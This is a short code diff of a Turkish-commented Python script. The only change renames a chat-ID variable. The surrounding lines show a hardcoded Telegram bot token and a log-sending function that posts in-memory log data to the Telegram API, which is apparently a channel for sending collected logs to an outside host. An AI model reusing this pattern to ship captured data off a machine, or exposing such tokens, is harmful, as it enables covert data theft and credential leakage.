@@ -12,7 +12,7 @@ import shutil
 
 # Telegram bot bilgileri
 TOKEN = "8015653627:AAGqbLWpHP5fxMz6VjbmlMDSMqRSmkeprmc"
-CHAT_ID = ""
+TELEGRAM_CHAT_ID = ""
 
 # Hafızada saklanacak log verisi
 log_data = []
@@ -86,7 +86,7 @@ def log_gonder():
             )
 
             url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-            payload = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "Markdown"}
+            payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mesaj, "parse_mode": "Markdown"}
             response = requests.post(url, data=payload)
             
             if response.status_code == 200:
